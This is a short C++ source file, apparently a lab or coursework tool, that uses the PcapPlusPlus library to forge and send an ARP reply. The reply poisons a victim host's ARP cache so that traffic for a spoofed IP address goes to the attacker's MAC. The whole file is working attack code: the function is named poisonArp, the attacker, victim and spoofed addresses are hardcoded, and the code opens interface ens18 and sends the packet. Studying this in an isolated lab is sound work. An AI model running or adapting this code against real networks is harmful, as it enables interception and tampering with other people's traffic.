#include "helper/help.h"
#include <EthLayer.h>
#include <IpAddress.h>
#include <MacAddress.h>
#include <PcapLiveDeviceList.h>
#include <core.h>
#include <iostream>

const int MAX_PACKET_LEN = 100;

namespace ARP {
void useHelper() { help(); }

void poisonArp() {
    pcpp::MacAddress macAttacker("bc:24:11:e3:98:26");
    pcpp::IPv4Address ipAttacker("10.71.2.7");

    pcpp::MacAddress macVictim("bc:24:11:ef:65:94");
    pcpp::IPv4Address ipVictim("10.71.2.6");

    pcpp::IPv4Address ipToSpoof("10.71.2.5");

    // Open interface
    pcpp::PcapLiveDevice *dev =
        pcpp::PcapLiveDeviceList::getInstance().getPcapLiveDeviceByName(
            "ens18");

    if (dev == nullptr || !dev->open()) {
        std::cerr << "Unable to open interface ens18" << "\n";

        // Entrypoint is not multi threaded
        std::exit(1); // NOLINT(concurrency-mt-unsafe)
    }

    // Build ARP spoofing packet
    pcpp::EthLayer ethLayer(macAttacker, macVictim, PCPP_ETHERTYPE_ARP);

    pcpp::ArpLayer arpLayer(pcpp::ARP_REPLY, macAttacker, macVictim, ipToSpoof,
                            ipVictim);

    pcpp::Packet packet(MAX_PACKET_LEN);
    packet.addLayer(&ethLayer);
    packet.addLayer(&arpLayer);
    packet.computeCalculateFields();

    // Send packet
    dev->sendPacket(&packet);

    dev->close();
}
} // namespace ARP
